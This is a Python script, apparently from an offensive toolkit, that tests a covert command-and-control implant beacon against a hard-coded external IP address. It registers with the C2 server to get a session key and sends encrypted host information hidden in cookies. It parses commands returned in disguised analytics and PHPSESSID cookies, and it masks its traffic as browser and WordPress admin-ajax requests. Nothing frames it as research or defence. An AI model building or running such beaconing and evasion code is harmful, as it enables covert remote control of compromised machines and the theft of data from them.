#!/usr/bin/env python3
"""
PROPER IMPLANT BEACON TEST
Mimics exactly what the real implant does
"""

import requests
import json
import hashlib
import base64
from cryptography.fernet import Fernet

print("=" * 70)
print("PROPER IMPLANT BEACON TEST")
print("Mimicking real implant behavior")
print("=" * 70)

C2_URL = "http://187.124.153.242:4444"

# Step 1: Handshake (stager registration)
print("\n[1] Handshake (stager registration)...")
fingerprint = "527c0c57d2fc4447bd0135ee7bcf6a096841ec650c70a8cebb72c4b392aa1d73"
implant_id_hash = hashlib.md5(fingerprint.encode()).hexdigest()[:8]

handshake_data = {
    "fp": fingerprint,
    "fingerprint": fingerprint,
    "machine_id": fingerprint,
    "implant_id_hash": implant_id_hash,
    "platform": "linux",
    "arch": "x64"
}

response = requests.post(f"{C2_URL}/handshake", json=handshake_data, timeout=10)
print(f"   Status: HTTP {response.status_code}")

if response.status_code != 200:
    print(f"❌ Handshake failed: {response.text}")
    exit(1)

result = response.json()
session_key_b64 = result.get("key")
print(f"✅ Handshake successful!")
print(f"   Session Key (b64): {session_key_b64}")
print(f"   Implant ID Hash: {implant_id_hash}")

# Step 2: Prepare beacon data like real implant
print("\n[2] Preparing beacon data (like real implant)...")

# Create Fernet object with session key
# IMPORTANT: The implant uses session_key.encode() (base64 string as bytes)
fernet = Fernet(session_key_b64.encode())

# Beacon data (same structure as implant.py line 487)
beacon_data = {
    "system_info": {
        "hostname": "proper-test-host",
        "platform": "linux",
        "arch": "x64",
        "user": "testuser"
    },
    "telemetry": {
        "cpu_percent": 25.5,
        "memory_percent": 55.2,
        "disk_free": "100GB"
    }
}

# Encrypt like implant does (line 489)
json_data = json.dumps(beacon_data).encode()
encrypted_data = fernet.encrypt(json_data)
print(f"   JSON data: {len(json_data)} bytes")
print(f"   Encrypted: {len(encrypted_data)} bytes")

# Base64 encode like implant does (line 456)
encoded_data = base64.b64encode(encrypted_data).decode()
print(f"   Base64 encoded: {len(encoded_data)} chars")

# Step 3: Send beacon with proper headers
print("\n[3] Sending beacon (proper headers)...")

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Cookie": f"session={encoded_data}",  # Like implant line 464
    "Authorization": f"Bearer {implant_id_hash}",  # Like implant line 465
    "Content-Type": "application/json"
}

# The implant sends POST with empty body (data is in cookie)
beacon_response = requests.post(
    f"{C2_URL}/api/v1/telemetry",
    headers=headers,
    data="",  # Empty body like implant
    timeout=10
)

print(f"   Beacon status: HTTP {beacon_response.status_code}")

if beacon_response.status_code == 200:
    print(f"✅ BEACON SUCCESSFUL!")
    
    # The response should be encrypted in a cookie
    cookies = beacon_response.headers.get('Set-Cookie', '')
    print(f"   Response cookies: {cookies[:100]}...")
    
    # Try to decrypt response
    for cookie_name in ['_ga', '_gid', '_fbp', 'xsid', 'PHPSESSID', 'sessionid']:
        import re
        match = re.search(f'{cookie_name}=([^;]+)', cookies)
        if match:
            encoded_resp = match.group(1)
            try:
                # URL decode
                import urllib.parse
                encoded_resp = urllib.parse.unquote(encoded_resp)
                
                # Base64 decode
                encrypted_resp = base64.b64decode(encoded_resp)
                
                # Fernet decrypt
                decrypted_resp = fernet.decrypt(encrypted_resp)
                response_data = json.loads(decrypted_resp.decode())
                
                print(f"🎯 DECRYPTED RESPONSE:")
                print(f"   {json.dumps(response_data, indent=2)}")
                
                if response_data.get("commands"):
                    print(f"   Commands received: {len(response_data['commands'])}")
                break
            except Exception as e:
                print(f"   Failed to decrypt {cookie_name}: {e}")
else:
    print(f"❌ Beacon failed: {beacon_response.text}")

# Step 4: Test alternative endpoint (WordPress mimicry)
print("\n[4] Testing WordPress mimicry endpoint...")

wp_data = {
    "action": "wpforms_submit",
    "wpforms[id]": "12345",
    "data": "test"
}

wp_encrypted = fernet.encrypt(json.dumps(wp_data).encode())
wp_encoded = base64.b64encode(wp_encrypted).decode()

wp_headers = headers.copy()
wp_headers["Cookie"] = f"PHPSESSID={wp_encoded}"

wp_response = requests.post(
    f"{C2_URL}/wp-admin/admin-ajax.php",
    headers=wp_headers,
    data="",
    timeout=10
)

print(f"   WordPress endpoint: HTTP {wp_response.status_code}")

if wp_response.status_code == 200:
    print(f"✅ WordPress mimicry working")
    # Check for encrypted response
    wp_cookies = wp_response.headers.get('Set-Cookie', '')
    if wp_cookies:
        print(f"   WordPress response cookie present")

print("\n" + "=" * 70)
print("TEST COMPLETE")
print("=" * 70)

if beacon_response.status_code == 200:
    print("\n🎯 RANGER IMPLANT BEACON IS WORKING CORRECTLY!")
    print("✅ Handshake → Session key exchange")
    print("✅ Fernet encryption/decryption")
    print("✅ Cookie-based data transport")
    print("✅ Header-based authentication")
    print("✅ WordPress mimicry functional")
    print("\n🔥 EXTERNAL IMPLANTS CAN NOW SUCCESSFULLY BEACON!")
else:
    print("\n⚠️ Beacon still failing")
    print("Check C2 logs for details")